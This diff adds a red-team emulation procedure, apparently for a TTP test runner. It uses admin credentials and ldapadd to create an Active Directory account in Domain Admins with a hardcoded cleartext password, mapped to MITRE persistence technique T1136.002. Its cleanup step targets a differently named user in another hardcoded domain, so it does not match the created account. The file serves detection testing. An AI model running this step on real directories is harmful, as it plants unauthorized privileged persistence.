@@ -1,0 +1,46 @@
+api_version: "2.0"
+name: Active Directory Create Admin Account
+description: |
+    Use Admin Credentials to Create A Domain Admin Account
+args:
+    - name: domain_controller
+      type: string
+      default: adVM
+    - name: domain
+      type: string
+      default: example
+    - name: top_level_domain
+      type: string
+      default: test
+    - name: admin_user
+      type: string
+      default: admin@example.test
+    - name: admin_password
+      type: string
+      default: s3CurePssw0rD!
+uuid: 562aa072-524e-459a-ba2b-91f1afccf5ab
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1136: Create Account'
+    subtechniques:
+        - 'T1136.002: Domain Account'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: active-directory-create-admin-account
+      inline: |
+        echo "dn: CN=Admin User,CN=Users,DC={{.Args.domain}},DC={{.Args.top_level_domain}}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@{{.Args.domain}}.{{.Args.top_level_domain}}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC={{.Args.domain}},DC={{.Args.top_level_domain}}" > tempadmin.ldif
+        echo ldapadd -H ldap://{{.Args.domain}}.{{.Args.top_level_domain}}:389 -x -D {{.Args.admin_user}} -w {{.Args.admin_password}} -f tempadmin.ldif
+        ldapadd -H ldap://{{.Args.domain}}.{{.Args.top_level_domain}}:389 -x -D {{.Args.admin_user}} -w {{.Args.admin_password}} -f tempadmin.ldif
+      executor: sh
+      cleanup:
+        inline: |
+            echo removing Atomic User (temporary user)
+            echo "dn: cn=Atomic User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif
+            ldapmodify -H ldap://{{.Args.domain_controller}}:389 -x -D {{.Args.admin_user}} -w {{.Args.admin_password}} -f deleteuser.ldif
+            rm deleteuser.ldif
+            rm tempadmin.ldif
+        executor: sh
